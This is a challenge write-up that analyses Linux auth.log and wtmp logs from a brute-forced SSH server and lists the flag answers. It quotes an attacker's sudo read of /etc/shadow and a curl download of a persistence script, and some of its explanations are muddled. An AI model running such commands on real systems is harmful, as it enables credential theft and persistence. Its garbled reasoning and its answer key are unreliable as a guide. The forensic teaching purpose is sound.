>[!tldr] In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

---
1. `Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?`
	- First, I used `nano` to read the files from `auth.log`
```shell
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68
Mar  6 06:31:31 ip-172-31-35-28 sshd[2330]: Invalid user admin from 65.2.161.68 port 46422
Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: Invalid user admin from 65.2.161.68 port 46498
Mar  6 06:31:31 ip-172-31-35-28 sshd[2328]: Invalid user admin from 65.2.161.68 port 46390
Mar  6 06:31:31 ip-172-31-35-28 sshd[2335]: Invalid user admin from 65.2.161.68 port 46460
```
- The ip `65.2.161.68` continously tries to login. This is our attacked IP
- Flag #1 -> `65.2.161.68`

---
2. `The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?`
	- I used `nano` to read the files from `auth.log`
```shell
sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
systemd-logind[411]: New session 49 of user cyberjunkie.
systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
```
- As we can see our attacked connects to the account `cyberjunkie` but the user is `root`
- Flag #2 -> `root`

---
3. `Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.`
	- A `wtmp` file serves as a historical record of all user logins, logouts, system boots, and shutdowns.
	- To read from a `wtmp` we can use:
```shell
❯ last wtmp
wtmp begins Wed Feb  4 15:51:30 2026
# Nothing

❯ who wtmp
ubuntu   pts/0        2024-01-25 06:13 (203.101.190.9)
root     pts/0        2024-01-25 06:15 (203.101.190.9)
root     pts/0        2024-02-11 05:33 (203.101.190.9)
root     pts/1        2024-02-11 05:41 (203.101.190.9)
root     pts/1        2024-02-11 05:54 (203.101.190.9)
root     pts/0        2024-03-06 01:19 (203.101.190.9)
root     pts/1        2024-03-06 01:32 (65.2.161.68)
cyberjunkie pts/1        2024-03-06 01:37 (65.2.161.68)
# Nothing

❯ utmpdump wtmp
Utmp dump of wtmp
<SNIP>
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
```
- As we can see our attacked IP `65.2.161.68`, connect at `2024-03-06 06:32:45` which is the flag
- Flag #3 -> `2024-03-06 06:32:45`

---
4. `SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?`
	- Scanning the lines I noticed `systemd-logind[411]: New session 37 of user root.`. That new session number `37` is the flag
- Flag #4 -> `37`

---
5. `The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?`
	- Inside both `auth.log` and `wtmp` we can find another user apart from root.
- Flag #5 -> `cyberjunkie`

---
6. `What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?`
	- On the https://attack.mitre.org/tactics/TA0003/ website we search through persistence and then all the techniques that use account creation.
- Flag -> `T1136.001`

---
7. `What time did the attacker's first SSH session end according to auth.log?`
	- Instead of looking at `auth.log` I checked `wtmp`

```shell
❯ utmpdump wtmp
Utmp dump of wtmp
<SNIP>
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
```
- As we ca see, right after root login in there is a `Event Type 8` which means system shutdown or reboot events. This must be our SSH session end for root which is our flag.
- Flag #7 -> `2024-03-06 06:37:24`

---
8. `The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?`
	- I `ctrl + f` to find a instance of `curl` since that is what is commonly used to download scripts. I then found a curl command downloading a .sh file.
- Flag #8 -> `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`